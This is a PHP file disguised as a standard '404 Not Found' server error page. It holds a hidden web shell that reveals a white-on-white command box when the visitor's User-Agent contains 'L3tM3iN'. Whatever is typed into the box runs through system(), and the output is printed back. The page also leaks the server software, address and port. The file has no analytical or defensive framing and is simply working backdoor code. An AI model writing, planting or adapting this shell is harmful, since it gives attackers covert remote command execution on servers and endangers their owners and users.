<html><head>
<title>!404 Not Found!</title>
</head><body>
<h1>Not Found</h1>
<?php echo "The requested URL " . $_SERVER['PHP_SELF'] ;echo"  ";echo "was not found on this server."; ?>
<hr>
<address><?php echo"" . $_SERVER['SERVER_SOFTWARE'];echo"  ";echo"Server at";echo "  " . $_SERVER['SERVER_ADDR'];echo " Port  " . $_SERVER['SERVER_PORT']; ?></address>
<style>
                input { margin:0;background-color:#fff;border:1px solid #fff; }
        </style>
        <center>
<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(isset($ua)) {
if (strpos($_SERVER['HTTP_USER_AGENT'], 'L3tM3iN') !== false) {
echo '<form method="post" action="<?php $_SERVER[\'PHP_SELF\']; ?>">';
echo '<input type="text" name="pwn">';
echo '</center>';
echo '<button align="right" name="Enter" type="submit" color="white"></button>';
echo '</form>';
                  }
if(isset($_POST['Enter'])) {
    if(!empty($_POST['pwn'])) {
        $command = $_POST['pwn'];
        $result =  system($command);
        }
    }
echo "" . $result;
}
?>
</html>
